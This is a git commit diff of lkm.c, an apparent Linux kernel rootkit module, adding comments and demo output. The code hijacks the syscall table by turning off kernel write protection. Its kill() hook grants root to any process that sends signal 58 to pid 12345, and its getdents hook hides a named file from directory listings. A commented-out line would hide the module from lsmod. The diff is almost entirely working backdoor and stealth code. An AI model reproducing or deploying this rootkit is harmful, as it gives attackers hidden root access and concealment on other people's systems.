dda3d58409d2e5d6b35ab660747dcde74decf66a
PsychoMario <pink.banana.fish@gmail.com>
2012-04-01 16:21:46 +0100

    Added file hiding example

--- lkm.c
+++ lkm.c
@@ -14,24 +14,19 @@
 #include <linux/fs.h>
 #include <linux/sched.h>
 #include <linux/fs_struct.h>
-//#include <linux/file.h>
-//#include <linux/errno.h>
-//#include <linux/mm.h>
-//#include <linux/security.h>
-//#include <linux/stddef.h>
 
 MODULE_LICENSE("GPL");
 
 #ifdef __i386__
-#define START_MEM   0xc0000000
+#define START_MEM   0xc0000000 //32bit kernel space
 #define END_MEM     0xd0000000
 #else
-#define START_MEM	0xffffffff81000000
+#define START_MEM	0xffffffff81000000 //64bit kernel space
 #define END_MEM		0xffffffffa2000000
 #endif
 
-#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
-#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)
+#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000)) //enables memory writing by changing a register somewhere
+#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)      //read somewhere it's terrible practice
 
 #ifdef __i386__
 unsigned int *syscall_table; 
@@ -39,7 +34,7 @@ unsigned int *syscall_table;
 unsigned int **find() { //finds the syscall table, not exported as of 2.6 (32bit)
     unsigned int **sctable;
     unsigned int i = START_MEM;
-    while ( i < END_MEM) {
+    while ( i < END_MEM) { //essentially brute force
         sctable = (unsigned int **)i;
         if ( sctable[__NR_close] == (unsigned int *) sys_close) {
             return &sctable[0];
@@ -53,7 +48,7 @@ unsigned long long *syscall_table;
 unsigned long long  **find() { //same as above but 64bit
 	unsigned long long **sctable;
 	unsigned long long int i = START_MEM;
-	while ( i < END_MEM) {
+	while ( i < END_MEM) { //essentially brute force
 		sctable = (unsigned long long **)i;
 		if ( sctable[__NR_close] == (unsigned long long *) sys_close) {
 			return &sctable[0];
@@ -64,20 +59,27 @@ unsigned long long  **find() { //same as above but 64bit
 }
 #endif
 asmlinkage int (*original_kill)(pid_t pid, int sig);
+/*
+[lkm@lkm ~]$ id
+uid=1000(lkm) gid=100(users) groups=100(users)
+[lkm@lkm ~]$ kill -58 12345
+[lkm@lkm ~]$ id
+uid=0(root) gid=0(root) groups=0(root),100(users)
+*/
 
 asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killing with sig 58
     if ((pid == 12345) && (sig == 58)) {      //and pid 12345 then give parent root privs
         struct task_struct *ptr = current;
         struct cred *cred;
-        cred=__task_cred(ptr);
-        cred->uid = 0;
-        cred->gid = 0;
-        cred->suid = 0;
-        cred->sgid = 0;
-        cred->euid = 0;
-        cred->egid = 0;
-        cred->fsuid = 0;
-        cred->fsgid = 0;
+        cred=__task_cred(ptr); //parent task creds
+        cred->uid = 0; //user id
+        cred->gid = 0; //group id
+        cred->suid = 0; //saved uid
+        cred->sgid = 0; //saved gid
+        cred->euid = 0; //effective uid
+        cred->egid = 0; //effective gid
+        cred->fsuid = 0; //VFS uid
+        cred->fsgid = 0; //VFS gid
         return 0;
     }
     return (*original_kill)(pid,sig);
@@ -87,8 +89,21 @@ asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killi
     hook getdents
     call the original with my own struct dirent
     go through dirent and prev->next = curr->next
-    memcpy_to_user() with my struct dirent to their struct dirent
-    will hide /proc/ entries as well to hide process
+    copy_to_user() with my struct dirent to their struct dirent
+    will (potentially) hide /proc/ entries as well to hide process
+*/
+
+/*
+[lkm@lkm ~]$ ls
+Makefile  lkm  lkm.ko
+[lkm@lkm ~]$ make load
+sudo insmod lkm.ko
+[lkm@lkm ~]$ ls
+Makefile  lkm
+[lkm@lkm ~]$ make unload
+sudo rmmod lkm
+[lkm@lkm ~]$ ls
+Makefile  lkm  lkm.ko
 */
 
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
@@ -103,25 +118,21 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
     char buf[count];
     int bpos,nread;
     struct linux_dirent *d,*nd;
-    char * hidefile = "lkm.ko";
-    nread = (*original_getdents)(fd,dirp,count);
-    copy_from_user(buf,dirp,nread);
-    for (bpos = 0; bpos < nread;) {
-        //printk("MATCH\n");
+    char * hidefile = "lkm.ko"; //this is the file we want to hide. one only at the moment
+    nread = (*original_getdents)(fd,dirp,count); //call the original function to get struct to manipulate
+    copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
+    for (bpos = 0; bpos < nread;) { //traverse...
         d = (struct linux_dirent *) (buf + bpos);
         nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
-        //printk("%d\n",!strcmp(nd->d_name,hidefile));
-        if (!strcmp(nd->d_name,hidefile)) {
+        if (!strcmp(nd->d_name,hidefile)) { //if we have a match to hidefile, make the prev record point to next
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
-        bpos += d->d_reclen;
+        bpos += d->d_reclen; //next
     }
-    //return nread;
-    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf));
+    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
     //i suspect i'm meant to be kfree'ing here...
-    return nread;
-    //return (*original_getdents)(fd,dirp,count);
+    return nread; //and return so the user process can use the getdents
 }
 
 static int init(void) { //initial function, sets up syscall hijacking
@@ -129,9 +140,9 @@ static int init(void) { //initial function, sets up syscall hijacking
 	syscall_table = find(); //give us the syscall table address for modification
 //    list_del(&myself->list); //remove from places such as lsmod
     //have to disable previous line otherwise you can't unload module without rebooting
-    original_kill = (void *)syscall_table[__NR_kill];
+    original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
     original_getdents = (void *)syscall_table[__NR_getdents];
-    //original_getdents64 = (void *)syscall_table[__NR_getdents64];
+    original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
     syscall_table[__NR_getdents] = new_getdents;
     syscall_table[__NR_kill] = new_kill;
